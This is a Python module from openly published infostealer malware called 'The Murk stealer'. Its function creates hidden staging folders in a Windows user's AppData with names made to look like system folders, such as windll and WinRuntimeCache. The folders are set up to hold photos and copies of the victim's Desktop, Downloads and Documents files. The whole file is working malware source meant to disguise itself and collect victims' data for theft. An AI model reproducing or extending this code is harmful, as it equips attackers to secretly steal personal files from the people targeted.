#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
"""
All imports
"""
from os import environ, sep, path, makedirs
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32api import SetFileAttributes


"""
Makes all needed directories
"""
def makeFolders(fileGrab,startOne):
    pathf = environ['USERPROFILE'] + sep + r'AppData\Local'
    file = open(rf'{pathf}\Temp\WinRuntimeCache\log.txt', "w+", encoding='utf-8')
    file.close()
    if path.exists(rf'{pathf}\windll'):
        print('none')
    else:
        if startOne:
            makedirs(rf'{pathf}\system\sysFiles\winDef')
            f = open(rf'{pathf}\system\sysFiles\winDef\log20742384.txt', 'w', encoding='utf-8')
            f.close()
        makedirs(rf'{pathf}\windll\System')
        SetFileAttributes(rf'{pathf}\windll', FILE_ATTRIBUTE_HIDDEN)
        makedirs(rf'{pathf}\windll\Photos')
        makedirs(rf'{pathf}\Temp\WinRuntimeCache')
        if not fileGrab:
            makedirs(rf'{pathf}\windll\Files\DocumentFiles\Desktop')
            makedirs(rf'{pathf}\windll\Files\DocumentFiles\Downloads')
            makedirs(rf'{pathf}\windll\Files\DocumentFiles\Documents')

